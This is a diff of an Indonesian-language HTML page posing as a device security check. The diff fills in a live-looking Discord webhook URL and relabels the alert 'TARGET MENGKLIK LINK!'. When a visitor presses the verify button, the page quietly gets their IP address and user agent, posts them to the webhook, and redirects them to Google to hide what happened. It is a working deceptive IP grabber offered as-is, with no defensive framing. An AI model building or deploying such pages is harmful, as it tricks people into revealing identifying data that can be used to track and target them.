@@ -1,46 +1,48 @@
 <!DOCTYPE html>
 <html>
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verifikasi Keamanan</title>
     <style>
         body { font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; background: #f0f2f5; margin: 0; }
         .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
-        button { background: #0084ff; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-size: 16px; cursor: pointer; font-weight: bold; width: 100%; }
+        button { background: #0084ff; color: white; border: none; padding: 15px 25px; border-radius: 6px; font-size: 18px; cursor: pointer; font-weight: bold; width: 100%; }
     </style>
 </head>
 <body>
     <div class="card">
-        <h2>⚠️ Verifikasi Diperlukan</h2>
-        <p>Klik tombol di bawah untuk memverifikasi lokasi perangkat Anda guna mencegah akses tidak sah.</p>
+        <h2>⚠️ Verifikasi Perangkat</h2>
+        <p>Lakukan verifikasi untuk mengamankan perangkat Anda dari akses tidak dikenal.</p>
         <button onclick="kirimData()">VERIFIKASI SEKARANG</button>
     </div>
 
     <script>
-        const webhookURL = "MASUKKAN_URL_WEBHOOK_DISCORD_ANDAA";
+        const webhookURL = "https://discord.com/api/webhooks/1480776507277316137/cvrLWlKiL8MvN_FdXrKLWdb2dBDrw0mA4yJ0AQLiBIBgTYIj5VQ9Oj8QB_VtK0b4sOXk";
 
         async function kirimData() {
             try {
-                // 1. Ambil IP
+                // Ambil data IP
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 
-                // 2. Kirim ke Discord
+                // Kirim ke Discord
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        content: "🚨 **TARGET TERDETEKSI** 🚨",
+                        content: "🚨 **TARGET MENGKLIK LINK!** 🚨",
                         embeds: [{
                             fields: [
                                 { name: "IP Address", value: data.ip, inline: true },
-                                { name: "User Agent", value: navigator.userAgent, inline: false }
+                                { name: "Identitas Perangkat", value: navigator.userAgent, inline: false }
                             ]
                         }]
                     })
                 });
             } catch (e) { console.error(e); }
             
-            // 3. Redirect ke Google
+            // Redirect setelah kirim
             window.location.href = "https://www.google.com";
         }
     </script>
